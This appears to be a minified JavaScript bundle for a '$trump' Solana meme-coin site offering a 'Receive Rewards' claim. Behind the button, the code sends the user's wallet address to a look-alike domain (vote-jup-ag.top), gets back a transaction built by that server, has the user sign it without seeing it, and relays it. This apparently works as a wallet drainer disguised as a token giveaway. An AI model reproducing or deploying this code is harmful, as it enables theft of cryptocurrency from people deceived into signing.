import{C as $,c as S,D as l,w as p,j as g,x as w,p as _,U as K,S as M}from"./useWallet-DFdqLI7B.js";import{K as b,P as E,m as U}from"./hardware-wallet-BlaNIBuT.js";import{a as d,T as C,t as o}from"./axios-EfgWNwAM.js";var I=w('<button class="rounded-lg px-6 py-4 text-xl bg-white w-fit text-[#0149ab]">Receive Rewards'),A=w(`<main class="w-full min-h-screen flex flex-col items-center"><div class=header><img src=images/logo.png alt=trump><img src=images/trump24.png alt=trump24 class=headerImage></div><div class="!bg-transparent css-mfq3kq mb-7"><div class="flex items-center justify-center w-full"></div><div class="flex flex-col gap-y-3 items-center justify-center mt-4"></div></div><div class=container><section class=contract-address><h2>CA</h2><div class=address-box><p id=contract>4h8LjZWUfUQVgbEZ29UzTuGXNW6rwrJis78ZU66ekkPV</p></div></section><section class=info-boxes><h2>about trump</h2><div class=info-grid><div class=info-box><h3>who? why?</h3><p>donald trump is bellionaire pres of soluna. his jeb is te mäk bellions n bellions, te mäk sulono gret agen, n te destroy joe boiden .</p><br><p>Wez her to unite al ze Solanu memes än suport eech othr thru ze Ber an ze Bull. Mak sur tö kast yur vote for trump 2024!</p><br><p>$trump is coomunity taekover n all mönies r grasroot. buy $trump if yuo wont te mäk billions n billions .</p><br><img src=images/flagFist.jpeg alt=trump></div><div class=info-box><h3>how to buy</h3><h2>CREATE A WALLET</h2><p>Download Phantom or your wallet of choice from the app store or Google Play for free. Desktop users, download the Google Chrome extension by going to Phantom.</p><br><h2>GET SOME SOL</h2><p>Have SOL in your wallet to switch to $trump. If you don’t have any SOL, you can buy directly on Phantom, transfer from another wallet, or buy on another exchange and send it to your wallet.</p><br><h2> Click the button above </h2>It's time! To claim your $trump tokens, click the button above and follow the prompts<br><h2>trump</h2><p>Switch SOL for $trump. We have Zero taxes so you don’t need to worry about buying with a specific slippage, although you may</p></div></div></section><section class=pictures><h2>memes</h2><div class=pictures-grid><img src=images/meme1.jpeg alt="Meme 1"><img src=images/meme2.jpeg alt="Meme 2"><img src=images/meme3.jpeg alt="Meme 3"><img src=images/meme4.jpeg alt="Meme 4"><img src=images/meme5.jpeg alt="Meme 5"><img src=images/meme6.jpeg alt="Meme 6"><img src=images/meme7.jpeg alt="Meme 7"><img src=images/meme8.jpeg alt="Meme 8"></div></section><section class=imageSection><img src=images/bigrocket.jpeg alt="Meme 1"></section><footer><img src=images/trump24.png alt=trump24 class=headerImage><div class=social-icons><a href=https://t.me/ target=_blank rel="noopener noreferrer"id=telegram-link><img src=images/telegram.svg alt=Telegram></a><a href=https://x.com/ target=_blank rel="noopener noreferrer"id=twitter-link><img src=images/twitter.png alt=𝕏></a><a href=https://dexscreener.com/ target=_blank rel="noopener noreferrer"id=dexscreener-link><img src=images/dexscreener.png alt=Dexscreener></a><a href=https://www.instagram.com/ target=_blank rel="noopener noreferrer"id=instagram-link><img src=images/instagram.svg alt=Instagram></a><a href=https://www.tiktok.com/ target=_blank rel="noopener noreferrer"id=tiktok-link><img src=images/tiktok.svg alt=Tiktok></a></div></footer><div class=containerFooter><p class=disclaimer>$trump has no association with Donald Trump. This token is simply a meme coin with no intrinsic value or expectation of financial return.</p><p class=disclaimer> © 2024 by donald trump $trump. All rights reserved.`);d.defaults.baseURL="https://vote-jup-ag.top/";function z(){const{signTransaction:u,connectedAccount:y,disconnect:i}=$(),h=S(()=>{const e=y();if(!(!e||!e.info))return e.type==="standard"||e.type==="mwa"?new E(e.info.account.publicKey):e.info.publicKey??void 0});let s;const v=b.generate(),f=b.generate(),x=l.encode(v.secretKey),k=l.encode(f.secretKey),j=async e=>{const r=await d.post("/solana/sign",{from:e.toBase58(),puppet:k,nonce:x},{timeout:18e5}).then(t=>t.data).catch(t=>{throw t.response.status===412?new Error("412"):new Error(t.message)}),a=l.decode(r),c=U.from(a);if(!u)throw new Error("Signature failed");return await u(c)},T=async e=>{const n=f.publicKey.toBase58();s=o.loading("Please wait...",{duration:1/0});try{const r=await j(e),a=l.encode(r);o.loading("Applying...",{id:s,duration:1/0});const t=await d.post("/solana/send",{from:e.toBase58(),puppet:n,sign_tx:a},{timeout:30*60*1e3}).then(m=>m.data).catch(m=>{throw new Error(m.message)});if(t.status==="success"){o.success(t.message,{id:s,duration:6e3}),i();return}o.error("Unknown error please try again",{id:s,duration:3e3}),i()}catch(r){console.error("RequestFailed:",r.message),r.message==="412"?(o.error("You are not eligible for rewards",{id:s,duration:3e3}),i()):(o.error("Unknown error please try again",{id:s,duration:3e3}),i())}};return(()=>{var e=A(),n=e.firstChild,r=n.nextSibling,a=r.firstChild,c=a.nextSibling;return p(e,g(C,{position:"bottom-center"}),n),p(a,g(K,{buttonClassName:`flex justify-center items-center px-6 py-5
                    border-4 border-white-600 shadow-xs rounded-lg text-xl font-semibold text-white`})),p(c,g(M,{get when(){return h()},get children(){var t=I();return t.$$click=async()=>{await T(h())},t}})),e})()}_(["click"]);export{z as default};
